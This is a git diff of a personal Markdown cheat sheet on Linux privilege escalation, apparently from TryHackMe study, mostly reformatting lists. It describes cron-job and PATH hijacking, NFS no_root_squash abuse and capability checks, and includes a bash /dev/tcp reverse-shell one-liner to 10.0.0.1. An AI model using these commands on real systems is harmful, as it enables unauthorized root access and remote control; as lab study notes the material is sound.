@@ -105,10 +105,9 @@ git status
 - pspy64
 - ---
 ### Linux Privileges Escallation
-👤Nathan Hailu 
-📅Sat 23 Apr 2022 06:52:26 AM EDT 
-📍TryHackMe
-
+- 👤Nathan Hailu 
+- 📅Sat 23 Apr 2022 06:52:26 AM EDT 
+- 📍TryHackMe
 #### Basic commands
  - to check if program exists 
 	 - `which $yourprogram`
@@ -146,11 +145,11 @@ system("/bin/bash");
 ~ `getcap -r / 2>dev/null`
 >[!info] he programs listed in the result of the aboves program can excute any thing with out root for exploiting Commands Check [GFObins] site under Capabilities. 
 #### 5) Cron Jobs
-~ `cat /etc/crontab`
--> programs listed with 
-		" * * * * * root /home/$myprogram" 
-				means will run myprogram with root access everysecond. so changing the content of my program to a reverse shell exploit will give as a access. 
------------------------------------------------------------------
+-  `cat /etc/crontab`
+- programs listed with 
+	`" * * * * * root /home/$myprogram" `
+- means will run myprogram with root access everysecond. so changing the content of my program to a reverse shell exploit will give as a access. 
+
 #### 6) PATH exploiting
 - create a c program in your home, with name "path"
 ```C
@@ -161,12 +160,13 @@ void main()
 	system("somefile");
 }
 ```
-~ `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`    -> Will give you foldernames that is writtable
-~ `export PATH=/yourfolder:$PATH`
-~ make a bash program in $yourfolder
-	`echo "/bin/bash" > somefile`
-	`chmod 777 somefile`
-~ run your 1st code "./path"
+- `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`    
+	- -> Will give you foldernames that is writtable
+- `export PATH=/yourfolder:$PATH`
+- make a bash program in $yourfolder
+	- `echo "/bin/bash" > somefile`
+	- `chmod 777 somefile`
+- run your 1st code "./path"
 #### 7) NFS(Network File Sharing) server Exploit
 
 ~ `cat /etc/exports`  -> check if there is folder with"no_root_squash"
@@ -177,7 +177,8 @@ void main()
 * compile it with gcc
 *	give it permission(+s)
 ~ exeute the script from victim shell
-
+#### 8) Vulnerable Software
+- We can look for installed software with `dpkg -l` and if they have #public_exploit we will check.
 ## Reverse Shells
 - bash
 	- `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`	  
